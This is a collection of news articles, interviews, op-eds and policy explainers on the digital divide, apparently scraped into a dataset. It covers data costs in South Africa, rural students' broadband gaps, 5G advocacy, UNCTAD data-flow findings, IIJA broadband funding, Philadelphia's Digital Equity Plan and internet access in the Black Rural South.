MK: Improvement of infrastructure, infrastructure that brings coverage to places that are outliers. That’s what I think the government can do; improve wifi access, improve coverage through access to the internet, and just make sure that in most places in the country, people that are living there can be able to access very good cell phone coverage and internet coverage as well. Also data is expensive and that needs to change.

Bringing the price of data down needs action from the government, I think everything starts there. Currently we don’t have any way to subsidise data from the government as citizens. If the government could be able to either subsidise or ensure that the private providers of data and internet make it more affordable, I think that would be something. There has to be a directive, which has to come from the government telling those guys to give us a better price.

Why is ending digital inequality so important for the future of education?

MK: We don’t know what the future holds and if you look at how expensive things become every year, for example, for students, just accommodation itself, having to move from where people live to come and get a flat or residence in the city, it’s so expensive that if we’re able to get better digital coverage, we could be able to teach anywhere, and they could be able to learn anywhere.

I believe, if the digital divide could be bridged, we don’t have to move around like we normally do. People could be able to multi-mode, and by this I mean, either be educated physically, or be there digitally. This actually would, in the long run, lead to a whole lot of costs saved, especially for those who cannot afford, and to a better life for everyone.

How has the digital divide increased the rate of inequality in the working world?

Rowan Spazzoli: As we’ve moved into lockdowns, the jobs that are digitally enabled are usually the higher-paying jobs, they are the ones that you need access to a computer for. A lot of opportunities are becoming more available online, and the growth of opportunities is developing less when it comes to opportunities outside of the digital landscape.

For example, recruitment happens a lot online, education happens a lot online, and if you don’t have access to data, to a device, and to the knowledge or the skills to be able to access it, it separates [people] far deeper than before in terms of inequality.

In what ways does digital illiteracy form a barrier between the unemployed and their future employment?

RS: This is a major area of concern, digital illiteracy essentially means that access to finding jobs that might be available through online means, for example from online platforms, immediately becomes something that you get cut out of, and as soon as that happens you almost narrow the amount of jobs that you have access to. Digital illiteracy creates a barrier to access to potential employment for people.

Secondly, traditionally a lot of times your CV would be mailed in or handed into an office, and working in a remote world or a digital world, that just doesn’t happen as much. I know that there are some organisations like Silulo which is an internet cafe company run by Luvuyo Rani — one of the most incredible social entrepreneurs — and what they have tried to do is train people and provide digital literacy skills so that they can make use of the internet cafe services to submit their CVs, and also help them put together their CVs.

What are some immediate actions South Africa can take to bridge the digital divide?

RS: A big one would be supporting organisations that are working in the space, like Silulo, various tech incubators like Bandwidth Barn in Khayelitsha which tries to make internet accessible and digital space accessible for entrepreneurs, and even various skills academies. I’d say the first part is supporting skills training, so supporting organisations that [teach] skills, the second is to lower the cost of data and lower the cost of connection to the internet. When we’re sitting with our data costs as high as they are, it actually is more expensive for somebody to access the internet with a mobile phone than with a fixed line. Providing free wifi services and providing low-cost data I think is essential to bridge the digital divide.

Skills are important, access to data is important or cheaper data or cheaper connection to the internet. I know that there’s an organisation that does that called Qwili which is trying to do that in terms of providing cheaper devices.

My biggest thing around access to digital spaces is that it immediately expands the world of opportunities that are available to a person. The more you’re able to provide access to digital literacy skills, access to being online and if we build software that caters to people in a way that makes online spaces more accessible to them, the more we’re able to level the playing field and make it a more equal ground.

Government, civil society, youth and business leaders are meeting for the Summit of the Americas in Los Angeles this week. While conventional wisdom holds that not much comes out of these summits, I believe this gathering – and the public private collaboration that is set to occur – offers a rare opportunity to make progress on the mounting challenges facing countries across the Western hemisphere.

The U.S. Chamber has the honor of partnering with the U.S. State Department to host the CEO Summit of the Americas, the official private sector stakeholder forum of the Summit proceedings starting today. I can attest that the level of interest among regional heads of state, their governments, and hemispheric business leaders in achieving tangible outcomes is extraordinarily high, and it’s easy to understand why.

The twin global health and economic crises spawned by the pandemic hit our region as hard as any. Despite accounting for less than nine percent of the world’s population, the western hemisphere has suffered nearly one-third of the planet’s COVID-19-related deaths. The pandemic’s impact has been exacerbated by stagnant economic growth and longstanding ills such as poverty, inequality, insecurity, corruption, and inadequate health care. As the hemisphere emerges from the cloud of COVID, new challenges such as rising inflation, especially in the food and energy sectors, threaten to further expose the region’s fragility.

Both government and private sector decision makers alike see the upcoming Summit as an opportunity to drive urgently needed public-private solutions. The U.S. and regional private sectors are committed to the cause of generating inclusive and sustainable growth throughout the Americas, and we have aligned our six priorities for the CEO Summit with those of the government Summit to encourage joint solutions.

Our top priority is promoting a strong rule of law throughout the region, as this is foundational to the success of our other objectives. We will cement collaboration with governments in Latin America and the Caribbean that are working to strengthen domestic institutions and enhance transparency, predictability, and certainty for business, and show how they stand to benefit from new investment and supply chain rebalancing because of it.

Our second priority is a pro-growth trade agenda, which is integral to the success of the entire hemispheric economy. The Chamber and regional private sector will work with policymakers to enhance market access and economic integration, prioritizing critical objectives such as improved supply chain resilience across the Americas.

Third, we seek to build more resilient health economies by leveraging private sector financing measures and digital health innovations to increase investment in health infrastructure and expand access to care.

Next, we will work to close the digital divide while advancing the technological transitions catalyzed by the pandemic. Digital innovation will support greater growth, transparency, and economic inclusion across the region. From governments, we will be seeking consistency of regulatory frameworks to optimize the efficacy of these tools.

Our fifth priority is easing the energy crisis. In addition to accelerating the production needed to drive down costs, we will illustrate ways in which the private sector is promoting an energy transition and advancing sustainability best practices.

Finally, we will ensure that small- and medium-sized enterprises – especially those led by women and minority entrepreneurs – are included in the opportunities that result from all of the above priorities. As the region’s prime job creators and engines of growth, no solution would be possible without their help.

More than just a single event, the CEO Summit of the Americas must drive momentum for action. The U.S. private sector is already working with our government to make certain we use the next two years of U.S. Summit oversight to advance follow-on activities and implement regional collaboration.

Since the last Summit of the Americas was held in 2018, our region and our world have changed forever. It’s our duty now to ensure better outcomes for all. For that to happen, leaders from the public and private sectors across the hemisphere must find consensus on our shared challenges and opportunities. The Summit of the Americas is our chance to lead from the front on solutions for our hemisphere and the rest of the world. Let’s make certain we take it.",Digital Inequality,2022-06-08 00:58:00

But without reliable access and time to spend in digital environments, rural students are falling behind their urban counterparts. Keith Hampton, professor in the Media and Information Department at Michigan State University, sheds light on how this divide affects students and how it may run much deeper than accessibility, just in time for back to school.

How big is the digital divide between rural, suburban, and urban students?

The extent of the problem is largely unknown because no one keeps reliable statistics on what households do or do not have internet access. However, in a recent survey of students from 15 Michigan school districts, we found that only 53% of students who live in small-town or rural areas have broadband internet access compared to 77% of those who live in suburbs and 70% of those in cities.

Keith Hampton, professor in the Media and Information Department at Michigan State University.

Some scholars have suggested that students without access to reliable internet experience a “homework gap” — how much does this affect students’ academic performance?

Almost all students report that they often receive homework that requires internet access. Students with broadband access at home leave homework incomplete less often and report being more interested in school. However, homework incompletion due to lack of home internet access tends to have only a small impact on most students' classroom grades. Where it really shows up is in performance on standardized exams like the SAT. Because of lower interest in school and less success at homework completion, students with poorer access to the internet tend to do worse on those exams. This is true of students who don’t have home broadband, including those with a slower home access, but is especially pronounced for those who are dependent on a cell phone for home internet.

Are there other factors at play in this performance gap, besides internet access?

Digital skills are an even bigger factor in students’ academic performance than homework completion. Students with more digital skills tend to receive only slightly higher classroom grades, but they perform much better on the SAT and similar standardized tests. Digital skills come from experience with a wide range of technologies, some of which might be found in the classroom. But, many of these skills come from less formal activities that tend to be less important to parents and teachers, such as using social media and playing video games. Students without home internet access have far fewer digital skills.

So students not only need to have access to the internet, but also dedicate time to using it outside of school?

Time spent using the internet and related media makes a big contribution to students’ digital skills. Digital skills are more than the ability to operate software and devices, they are a broader set of computational and language skills that help students process information. These “21st Century skills” often come from spending time online, working, playing and experimenting. In turn, digital skills are related to other cognitive and noncognitive skills that improve performance on standardized exams.

But can’t spending time on the internet and social media hurt academic performance?

Some scholars have suggested that spending time on some media, such as television, displaces time students would otherwise spend on activities that support their academic achievement. We did not find evidence to support these claims for internet-related activities. The benefit of using internet-related technologies, including using social media — because they contribute to building digital skills — generally outweighs any negative effect on other activities.

How might the digital divide affect these students long term?

Rural students are less likely than their urban and suburban peers to attend a college or university. Lower grades and weaker standardized test scores associated with poor internet connectivity and fewer digital skills further reduce their ability to pursue postsecondary education and qualify for scholarships. Compared to a high school diploma, having a college degree increases earning potential. And, earning potential is greater with or without a bachelor’s degree for STEM related occupations, which are heavily dependent on digital skills. Lower levels of broadband connectivity in rural areas reduces the ability of students to succeed in an increasingly digital economy. This impact on rural students has ripple effects on local communities, contributing to unemployment and higher rates of poverty.

Has COVID-19 changed things?

A major disruption like the COVID-19 pandemic has made clear just how important broadband connectivity is for access to education, health care and employment. For over two decades scholars have been warning about the social and economic dangers of ignoring the digital divide. For too long, broadband access has been treated as a luxury and not a necessity. COVID-19 has raised awareness among local, state and federal officials of the urgency of this issue.

What can students, parents, educators, or communities do to address this digital inequality?

Parents and educators need to think beyond access. While access is a necessary requirement, the real benefit to young people is in how they use the technology. Lower levels of access in rural areas broadly reduce interest and trust in internet technologies. As such, parents and teachers are likely to place less emphasis on these technologies and the students who excel in their use. We found that teachers were more likely to give higher grades to students who engage in traditional extracurricular activities, mainly sports, than to those with more digital skills. Additionally, rural students who spend more time on sports are more likely to express an interest in going on to college or university than those students with more digital skills. Culture might be more difficult to change than putting wires in the ground. Initiatives to reduce inequalities in access need to focus as much on making visible the value of using digital media for individuals and communities as they do on building infrastructure.

An open, modern 5G infrastructure, jointly built by the telecom, cloud and IT industries, can help close this digital divide.

In 2020, the world embraced digital transformation at an expedited pace, reimagining technology’s critical role in how we work, learn and live. At the same time, the COVID-19 pandemic illuminated a long-standing issue: billions of people remain without the universal human right of internet access.

Many rural and low-income communities around the world, including those in large urban areas, lack reliable, affordable access. More importantly, wireless technology is no longer just important for consumers and entertainment; it is rapidly becoming critical to how we connect everything in the digital world, from smart home systems to autonomous vehicles.

I’ve always believed that technology has the ability to do a tremendous amount of good and help humans thrive and achieve things that once seemed impossible. Technology is meant to be the great equalizer, not a source of division. Unfortunately, the gap between the haves and have nots is widening across the US and the world due to a lack of internet access for both people and an expanding pool of connected intelligent devices. Advancing the global good must start with ensuring everyone on Earth can go wireless and access the full capability of technology. Closing the digital divide is reliant on making 5G available to everyone, everywhere, in a modern and open way.

Narrowing the gap

According to the FCC, 97% of Americans in urban areas have access to a high-speed, fixed service. In rural areas, that number falls to 65% and on tribal lands to 60%. In total, nearly 30 million Americans cannot fully benefit from the digital age.

The global outlook is even more dire. According to an International Telecommunication Union report, in the developed world the internet penetration rate is 87% but just 47% in developing countries and 19% in the least developed countries.

Internet access is low among the economically vulnerable Image: Statista

Remote learning during the pandemic has been far from universal and primary and secondary school students (K-12 in the US) who are defined as “poor” suffer from the digital divide. A study by the US’ National Center for Education Statistics’ National Assessment of Educational Progress suggests that poor students are less likely to have the equipment needed to attend online school; 7% of eighth-graders who are poor don’t have internet access compared to only 1.6% of non-poor students. Without reliable internet, these economic inequalities will continue to grow.

People without robust internet access are being left behind academically and economically. We have a moral imperative to ensure everyone can be part of the Fourth Industrial Revolution. Through early investments and targeted deployments, 5G can create value across local and national economies and contribute to economic stimulus. Furthermore, with the innovation 5G enables, we can transform industries like education and healthcare, job and skills training, civic engagement and even public services. This is only possible if we make 5G the responsibility of not just traditional telecom but a shared focus of the telecom, cloud and IT industries.

Building a new kind of connectivity

Building 5G infrastructure is a massive undertaking requiring a multitude of additional cellular towers and new distributed architectures using software-defined networks – it is not simply an evolution of 4G. It’s reasonable to describe the build-out of both public and private 5G at a national and global scale as one of the most massive infrastructure programmes of our generation. Today, however, the state of the telecom industry and technology has fallen behind the evolutionary speed of the cloud and IT worlds. This makes early 5G more expensive and more difficult than it needs to be to achieve impact.

Additionally, current efforts to develop 5G networks have been segmented, with most regions seeing no 5G deployment at all and to date only limited use of 5G by enterprises. Segmentation can deepen the digital divide, restrict innovation and even limit much-needed digital transformations of health, education and transportation. To address segmentation, we need to dramatically expand the technology system that can deliver the innovation and outcomes of 5G.

This starts by rethinking how 5G systems should be built. We need to shift away from legacy telecom architectures and embrace virtual, software-defined, open and automated technologies. This requires investment from major IT and cloud companies, which has already started but needs to move faster.

Public-private collaborations will be a critical tool to pull the cloud and IT industries into the evolution of 5G. Governments must find ways to attract companies by sharing risk and creating incentives to lower the overall costs of deployment, prevent vendor lock-in and allow for the transition to the next iteration of technologies like 6G. With the capital, resources and talent to build a national 5G infrastructure, cloud and IT systems can increase their participation in 5G and provide at-scale solutions sooner.

With 5G, we can achieve what was once impossible for humans. Imagine a globally connected virtual classroom that enables every student to learn regardless of language, comprehension style or geography; or doctors around the world who can use AI and edge computing to take advantage of real-time intelligence for quicker, more collaborative and focused patient care; or a city where citizens are connected to critical services through autonomous transportation that brings those services to them. All of this can be made possible through a 5G system that is realised through the combined effort of the telecom, cloud and IT industries.

The time for transformative change

By investing in emerging technologies like 5G wireless communications technology, governments and the private sector can come together to address the inequities in our communities and create meaningful, permanent change to guarantee all citizens have access to the technology they need for work and school.

Furthermore, countries that drive this innovation and create a broader, more robust technology system to support their development of 5G infrastructure can increase market competitiveness, prevent vendor lock-in and lower costs at a time when governments globally need to prioritize spending. This investment will help businesses and governments create more sustainable and inclusive economies, which will be critical to long-term business continuity and human progress.

For many, the pandemic has recast our view of internet connectivity for all as a critical component to an equitable society. We believe that we will need the entire cloud, IT and telecom industry working together as we enter the next era of connectivity – an era of connecting not just everyone, but everything; and not just transforming access but enabling the digital transformation of every element of our economy and society.",Digital Inequality,2021-01-27 08:00:00

The data-driven digital economy is surging. Recent estimates show that global internet protocol (IP) traffic – a proxy for data flows – will more than triple between 2017 and 2022, according to UNCTAD’s Digital Economy Report 2021 released on 29 September.

The COVID-19 pandemic has markedly increased internet traffic, as many activities have moved online. Global internet bandwidth rose by 35% in 2020, compared with 26% the previous year, the report says.

A growing part of data flows is related to mobile networks. With the increasing number of mobile devices and internet-connected devices, data traffic by mobile broadband is expected to account for almost one third of the total data volume in 2026, the report states.

“But the data-driven digital economy is characterized by large imbalances and divides,” said UNCTAD’s director of technology and logistics, Shamika N. Sirimanne. “As the digital economy grows, a data-related divide is compounding the digital divide.”

Developing countries in subordinate positions

In this new configuration, developing countries risk becoming mere providers of raw data to global digital platforms, while having to pay for the digital intelligence obtained from their data, the report warns.

Only 20% of people in least developed countries (LDCs) use the internet, and when they do, it’s typically at relatively low download speeds and with a relatively high price tag attached, the report says.

Also, the average mobile broadband speed is about three times higher in developed countries than in LDCs. And while up to eight out of 10 internet users shop online in several developed countries, only less than one out of 10 do so in many LDCs.

International bandwidth use is geographically concentrated along two main routes: North America – Europe and North America – China.

Digital giants reinforce their dominance

The largest digital platforms – Apple, Microsoft, Amazon, Alphabet (Google), Facebook, Tencent and Alibaba – are increasingly investing in all parts of the global data value chain, the report says.

They are investing in data collection through user-facing platform services; data transmissions through submarine cables and satellites; data storage (data centres); and data analysis, processing and use, for instance through artificial intelligence (AI).

The sizes, profits, market values and dominant positions of the platforms have further strengthened during the pandemic as digitalization has accelerated.

Thanks to privileged access to data, network effects and economies of scale and scope, these platforms have become global digital corporations with planetary reach; huge financial, market and technology power; and control over large swathes of data about their users.

According to the report, Amazon has invested some $10 billion in satellite broadband.

Amazon, Apple, Facebook, Google and Microsoft were the top acquirers of AI startups between 2016 and 2020.

Four major platforms (Alibaba, Amazon, Google and Microsoft) accounted for 67% of global cloud infrastructure services revenues in the last quarter of 2020.

By 2022, the share of global digital advertising spending by five major digital platforms – Alibaba, Amazon, Facebook, Google and Tencent – is expected to exceed 73%, up from 50% in 2015.

New global data governance approach needed

As cross-border data flows become increasingly prominent in the digital economy, UNCTAD has called for a new approach to properly regulate them at the international level.

Currently, entities that can extract or collect data are in a privileged position to appropriate most of the value.

“A new international system to regulate data flows is needed so that associated benefits can be more equitably distributed,” said Sirimanne.

She said the world should pay adequate attention to the current divides that characterize the global digital economy not only between countries, but also between states and enterprises.

Torbjörn Fredriksson, who leads UNCTAD’s e-commerce and digital economy branch says that “the shortage of appropriate skill sets in governments can result in insufficient representation of technical and analytical expertise in legislative and regulatory framework development processes”.

This he says in turn hampers the ability of governments to identify opportunities that could be afforded by digital technologies and potential risks and threats that could emerge, as well as ways to regulate them.

According to the report, less-developed countries also suffer from losing their top talent to developed countries and have smaller representation in setting up the global policy discussion – contributing further to the growing global inequality.

While all countries will need to allocate more domestic resources to the development of their capacities to create and capture the value of data domestically, the report says, many developing countries may need international support due to their limited financial, technical and other resources.",Digital Inequality,2021-09-29 07:00:00

Back in the day, digital folks would say that ICTs were sure to empower the poor: that they’d be instruments of social transformation, enablers of equality.

Now we know things are much more complicated. Sure, there are ways in which new technologies create new opportunities. They can enable those without to gain more than they had (in terms of power and resources). This is a powerful positive agenda.

But inequality has also grown in the emerging age of digital technology. I’ve written in the past about two key factors here:

that those who have advantages to start with are better placed to buy, to use and to gain benefits from digital technologies than those who start with disadvantages;

and (therefore) that new technologies can both empower and disempower simultaneously – giving the disadvantaged opportunities they didn’t previously have, but widening the gap in opportunities and outcomes between them and those who’ve started out with more.

The key point here is the relationship between pre-existing social and economic inequality and the digital inequality that’s often called a digital divide.

Digital Disconnect

I’m returning to this theme today thanks to a new analysis of the causes and consequences of digital inequality by Ellen Helsper, Professor of Digital Inequalities at the London School of Economics. Her focus lies in that relationship, and on the way poor understanding of it has led to policies that are inadequate and can be counterproductive.

She talks about this inThe Digital Disconnect. The case she makes is thorough and sophisticated, and should be widely read. I’ll draw on it to revisit six themes that could improve policymakers’ understanding. The following’s inspired by her arguments, though not necessarily consistent with them.

Poverty and inequality

First, it’s important to distinguish poverty from inequality and disadvantage. It’s possible for people to move out of poverty, as quantitatively measured, and to do so with the help of ICTs, while their society gets more unequal, and the gap widens between the options, opportunities and outcomes they enjoy and those of people higher up the ladder of prosperity or social opportunity.

This is obviously true of individuals, and can also work through categories – the landless, say; those with limited educational experience; women and girls in societies that heavily constrain their opportunities.

Digital and other inequalities

Second, digital inequalities arise from (and tend to follow) pre-existing inequalities within society. The digital world differs for people, Helsper says, “based on [their] starting point”, and she prefers therefore to use the term “socio-digital inequality” to describe the mix.

It’s not simply that the rich get richer because they can take more advantage of new things. It’s that they can leverage that digital advantage through their other networks and resources – economic, social, educational – and their established capabilities – to invest, to write, to publish, to engage with and be heard and listened to by others.

Digital inequalities don’t just arise from pre-existing inequalities, therefore; they also tend to reinforce them. New technologies are designed with the more prosperous in mind because that’s where the most profitable markets lie. There’s a feedback loop here, if you like, between digital and other inequalities, and it means two things:

digital inequality can’t reduce socio-economic inequality in the way that early optimists had hoped;

nor can digital inequality be tackled without also tackling the underlying inequalities within society.

Inequality is complex and intersectional

But inequalities are not (just) about individuals; they’re structural, they’re systemic, they’re intersectional.

To start with, in the ‘90s, policy on digital engagement was very simple: “there is a digital divide; it should be bridged.” This reached back to the Maitland Commission, which revealed the telecoms divide in 1984.

Over time, as the variety of digital divides became more clear, more disaggegation’s taken hold. Researchers and policymakers have spent more time looking at the differences due to geography, and exploring the experience of different demographic groups.

A lot of attention has been paid to gender. There’s been a lot of focus on engaging youth (in practice the most digitally active age group), much less focus on the elderly (the least digitally active). Significant attention has been paid to those with disabilities. Some analysis has addressed educational differences, less perhaps differences of language, race or class; much less, issues of caste.

So the diversity of inequality within society has been more recognised, but it’s still seen in rather simple terms, often in siloed groups. Helsper points to two things that are often missing here:

too little’s done to understand the differences within those demographic categories.

those demographic categories. and too little’s done to understand that disadvantage is not siloed but intersectional: disadvantage is derived and exacerbated by the multiplicity of factors affecting individuals and social groups.

Inequality is complex and multifaceted

Inequalities arise in different contexts and in different ways – within the digital environment and in its impacts.

In the early days of thinking about digital divides, it was access that was emphasised: infrastructure, connectivity, cheap and accessible devices, services and places that gave public access. The focus shifted around the turn of the century when terminology like ‘real access’ became fashionable, recognising that capabilities and content also mattered. More recently, more attention has been paid to the quality of access, particularly broadband.

But inequality’s experienced – and affects experience – in different layers along a kind of value chain: in access, skills and usage, in the opportunities that arise from these, and above all in the outcomes/impacts felt by users and non-users.

There’s a crucial difference here between what technology can offer – its potential, its opportunity – and the extent to which it’s used in practice by different individuals and social groups. A crucial difference too between opportunity and outcome, and the different extents to which the former turns into the latter.

“What [people] get out of digital engagement depends on the offline resources that [they] have and the online resources [that they] use,” says Helsper. Some individuals will gain from this, and others will lose out.

Where impact is concerned, she suggests five areas of focus.

Most attention has been paid to economic opportunities and outcomes, partly because that fits within prevailing government and business models, partly (I suspect) because they’re easier to measure and claim credit for. Less, though significant, attention has been paid to educational outcomes and civil and political engagement, which are of special interest to rights communities. Least has been paid to qualitative aspects of the digital experience: to what economists in government have often seen as trivial pursuits (like entertainment) and to the glues that hold societies together.

Policy requirements

What does this mean for policies on inequality: digital, social and socio-digital? Essentially that they have been too unsophisticated, less effective than they might have been, and at times have been counterproductive.

Digital technologists, businesses and policymakers have held powerful aspirations for their tech, right from the start and as it has evolved. They have believed and have declared that it will deliver better lives for all, including more prosperity and less inequality/disadvantage.

More tech – more and better infrastructure, more and cheaper access, bridging ‘digital divides’ in connectivity – has therefore been the heart of their response not just to digital inequality but inequality all round. Coupled, more recently, with an emphasis on building skills, especially the skills required to work in digital economies.

More tech and skills are necessary aspects of enabling digital equality, but Helsper powerfully shows that they are not sufficient. Infrastructure, access and lessons in digital literacy don’t necessarily turn into use; use does not necessarily turn into opportunity; and opportunity does not necessarily turn into favourable outcomes.

Other factors are important here, such as social norms that constrain behaviour, lack of access to financial capital and social networks, lack of confidence, the sense that technology and the opportunities it offers aren’t for “the likes of us” (often because those opportunities are, in fact, much more available to “them”).

Many policies designed to address digital inequalities miss their targets because they’re driven by supply-side assumptions – that better infrastructure will be of equal benefit to all, for instance, or that teaching skills in schools will reach all children equally – rather than real lives lived on the demand side of the tracks. Why so? Partly, at least, because too few policymakers have spent sufficient time asking the targets of their policies about their lives and what might make them better.

Politics, policy and scholarship

Some final thoughts about the relationship between policy and scholarship – for work like Helsper’s is found largely in academic books and journals.

Politicians, technologists and business leaders, I’d suggest, tend to have powerful goals they hope to gain. Politicians are keen to find ‘solutions’ that will be popular. Technologists are eager to promote new tech they have developed. Businesses are keen to promote new services they’ve brought to market and maximise their profit margins.

All are keen to move fast, achieve quick gains, and fix things later if they don’t work out quite as they had assumed.

The long-term interests of society, however, require more than this. Short-term gains don’t necessarily bring long-term value. What works well for the majority might well work badly for minorities. Including the marginalised is difficult and requires deep understanding of the way that public policies are interacting with the causes and the consequences of digital and social inequalities.

That sophisticated understanding has to come from research and analysis, from multiple disciplines, from academia and the more scrupulous research institutes and think tanks.

Scholarship’s inevitably slower off the mark, requiring evidence to be gathered that will test assumptions; in-depth analysis of what has happened rather than what might, what’s been unanticipated as well as what had been expected; investigating impacts not just on target populations but on groups within those groups, and other groups who’ve also been affected.

The language of politics (and of enthusiasm)’s often populist; that of scholarship nuanced and specialist.

Good policymaking needs to tread a line between the urgency of acting now and the need to understand the implications, enabling innovation while mitigating risks. To achieve it, governments and businesses need to fund the necessary research, understand the complexity of the societies they serve and govern, learn from experience and from analysis, and be prepared to change their policies and practices when what they have been doing has proved ineffective. If they do that, they have more chance of achieving ‘digital connect’ than ‘disconnect’.

The IIJA seeks to address the nation’s “digital divide” that exists between broadband users and those who lack connections (whether due to unavailability or unaffordability) with $65 billion for broadband deployment, affordability, and digital literacy. The COVID-19 pandemic exposed the key resources that those without broadband subscriptions are often deprived of: education (e.g., reliable connection for remote learning, transition to college), health care (e.g., telehealth), and labor market opportunities (e.g., training, applications, job placement).

This article will explore the IIJA’s broadband provisions, the necessary steps that state governments must make to unlock the bill’s funds, and the potential impact on Fifth District residents. Closing the digital divide will require multiple actors (state and local governments, federal agencies, and broadband providers) to work together to fulfill the IIJA’s funding requirements while addressing local needs.

The Digital Divide

The digital divide refers to the gap in opportunities caused by unequal access to online resources among American households. As society has become increasingly digitally dependent over the past decade, the presence of this disparity has become a growing concern.

The digital divide is driven by two co-occurring gaps: access and adoption. The access gap largely reflects the disparity in broadband infrastructure availability between metro and rural areas. The adoption gap is driven by low-income residents’ inability to afford broadband subscriptions even where the infrastructure is available.

Broadband Funding in the IIJA

The IIJA addresses the access component of the digital divide by providing $42.5 billion in state grants for broadband deployment, the largest component of broadband funding in the bill. States will receive at least $100 million each, with remaining funding determined by a formula that accounts for the number of unserved and high-cost locations in each state. In order to set a minimum standard of service nationally, states are required to prioritize their deployment efforts in unserved areas that do not provide service speeds of at least 25 megabits per second (Mbps) download and 3 Mbps upload. Then, states may direct remaining funds toward underserved areas (service below 100/20 Mbps). An additional $2 billion will be set aside for U.S. Department of Agriculture grants and loans for rural regions to construct, improve, or acquire facilities and equipment needed for broadband deployment.

The law addresses the adoption component of the digital divide with $14.2 billion for the Affordable Connectivity Program, which provides discounted broadband subscriptions and devices to low-income households. Nearly all of the nation’s broadband providers will be able to participate in the program and receive subsidies for discounting service to qualifying households.

IIJA’s third major broadband component provides $2.75 billion to fund Digital Equity Act Programs. The goal of these programs is to “ensure that all individuals and communities have the skills, technology, and capacity needed to reap the full benefits of our digital economy.” This set of programs will target covered populations such as low-income households, individuals with disabilities, and rural inhabitants, among others. In addition to assisting the covered populations in adopting broadband, the Act facilitates grants to workforce development programs that aim to leverage their broadband access into job training and opportunities.",Digital Inequality,2022-03-03 08:00:00

The third goal put forth in the city's digital equity plan addresses the necessity of digital literacy and its relevance to succeeding in work and life, as more institutions become digital-first.
Lastly, the digital equity plan seeks to create a more improved digital ecosystem citywide.","The importance of reliable access to internet has never been more clear than in these past two years, as the COVID-19 pandemic has upended every aspect of our lives, from education and work, to entertainment and media consumption. And although city officials are solid on the fact that Philadelphia as a city does not lack access to broadband internet, officials within the Office of Innovation and Technology found that some portions of Philadelphia's residential community have more access than others.

That is the focus of the Digital Equity Plan, a five-year commitment from city officials put into place through an executive order signed by Mayor Jim Kenney in early February. The plan incorporates new and existing initiatives, all aimed at ""bridging the digital divide"" for underserved Philadelphians.

The National Digital Inclusion Alliance defines digital equity as ""the condition in which all individuals and communities have the information technology capacity needed for full participation in our society, democracy, and economy.""

A report conducted by city officials in October found that 84% of Philadelphia households had consistent, reliable access to broadband internet, up from 70% in 2019. 75% of Philadelphia households have a working desktop or laptop computer, which has become a necessity as digital learning, remote working, and telemedicine become more common.

33% of Philadelphians are estimated to be ""subscription vulnerable,"" which city officials describe as those who cannot consistently afford subscriptions to high quality broadband services. In discussions in residents, 75% said that an internet bill above $20 per month would be too high.

""The pandemic has made the digital divide and its inequities and consequences for day-to-day survival a visible reality, if not a visceral experience, for all Philadelphians,"" wrote Mark Wheeler, chief information officer for the city. ""When schools, offices, and stores are shuttered and non-emergency medical services move online, those without consistent and reliable internet access are cut off from the world.""



According to the five-year plan, 96,000 Philadelphia households are currently without broadband access at home. Affordability remains the largest concern among Philadelphia residents attempting to access high quality broadband service.

Though the broad, sweeping goal is to expand broadband access to every household in Philadelphia, both the October report and this five-year equity plan focus on several key ""populations in need"" of assistance. These include K-12 households, seniors, Black households, Hispanic households, multilingual households, and low-income households.

The digital equity plan has four key goals

""Philadelphia will continue its diligent work toward establishing digital equity for all,"" said Mayor Kenney. ""The executive order establishes a policy that emphasizes the importance of digital equity for our city and enables the creation of the Digital Equity Plan.""

The city identified four primary goals in expanding access and affordability, detailing both new and existing strategies to achieve them. These include expanding access to devices, connectivity, training, and improving the overall digital ecosystem.

12% of Philadelphians do not have any kind of digital device, including a cell phone, and 19% of residents do not have a working computer, laptop, or tablet. In order to improve access to devices at an affordable price for the nearly 24% of Philadelphians living in poverty, according to Pew Charitable Trusts.

These include distributing devices to all adults enrolled in adult literacy or workforce preparation classes, ensuring devices for all students in all of Philadelphia's schools, and utilize organizations like the Free Library of Philadelphia to use its bulk purchasing power to distribute devices to underserved residents.

The plan also highlights the importance of expanding access to public computers, including those available at the Free Library, with priority for multilingual communities and others that experience greater need. Increasing the city's initiative for refurbished technology is also high on the list of strategies.

Along with improving access to working devices, expanding broadband access has been high on the priority list for both city and state government for several years. In Harrisburg, Gov. Tom Wolf recently signed legislation to create the Pennsylvania Broadband Authority, which will oversee statewide efforts to enhance broadband access.

The most common strategy put forth by the city to enhance access to broadband services is to provide household subsidies, including through PHLConnectED, which provides free internet to K-12 households who need it. The city wants to create a long-term funding stream to support and expand the program.

Other proposed initiatives include utilizing recreation centers and other community hubs to serve as ""Digital Anchor Institutions"" and provide broadband access to every neighborhood. There are more than 200 recreation centers across the city, many of which are already utilized by the community as hubs for connection.

The third goal put forth in the city's digital equity plan addresses the necessity of digital literacy and its relevance to succeeding in work and life, as more institutions become digital-first. The plan notes that these issues with digital access are exacerbated in people who have a high school diploma but not a college degree.

In Philadelphia, 12% of adult residents do not have a high school diploma, meaning that they are more likely to have trouble with digital literacy.

Some of the initiatives proposed by the city include expanding digital literacy programs, beginning in early elementary school. Further, requesting state and federal funding would be necessary, according to the plan, to expand digital literacy programs for workforce development.

The plan further expands digital literacy programs by proposing to make content available in multiple languages and making courses publicly available to register.

Lastly, the digital equity plan seeks to create a more improved digital ecosystem citywide. These initiatives include expanding on the programs that already exist, while also creating data benchmarks for the city to pass on its way to achieving a more equitable digital landscape.

In terms of sustainable funding, the Office of Innovation and Technology suggest using portions of American Rescue Plan Act funding to target some of the initiatives in need of large-scale, sustainable funding efforts, like PHLConnectED. Other ideas for funding include state assistance, as well as public and private partnerships with hospitals, banks, and internet service providers would help as well.",Digital Inequality,2022-02-20 08:00:00

LOS ANGELES/WASHINGTON, Oct 6 (Thomson Reuters Foundation) — The lack of internet access in the United States is particularly pronounced in rural, southern areas with higher Black populations, researchers said Wednesday amid a battle in Congress over how to close the digital divide.

African Americans across rural counties in 10 mostly southern states were nearly twice as likely to report not having home internet access as white Americans in the same region, said a report by the Joint Center for Political and Economic Studies.

That dynamic amplifies existing ""structural racism"" that African American families face in rural areas across the southern states, said Dominique Harrison, the author of the report by the Washington, DC-based think tank.

""Despite constant conversations about rural access to broadband in the US, most of it is focused on white rural residents,"" Harrison told the Thomson Reuters Foundation.

""This is data that's important for all policymakers to see,"" she said.

If passed, the bill would represent ""the biggest broadband investment in our history to close the digital divide,"" US Senator Michael Bennet of Colorado said in an emailed statement.

The study examined the area known as the Black Rural South: 152 counties in the states of Alabama, Arkansas, Florida, Georgia, Louisiana, Mississippi, North Carolina, South Carolina, Tennessee, and Virginia where at least 35% of the residents are Black.

In those regions, 38% percent of African Americans said they lack home internet access, compared to 23% of white Americans in the same areas.

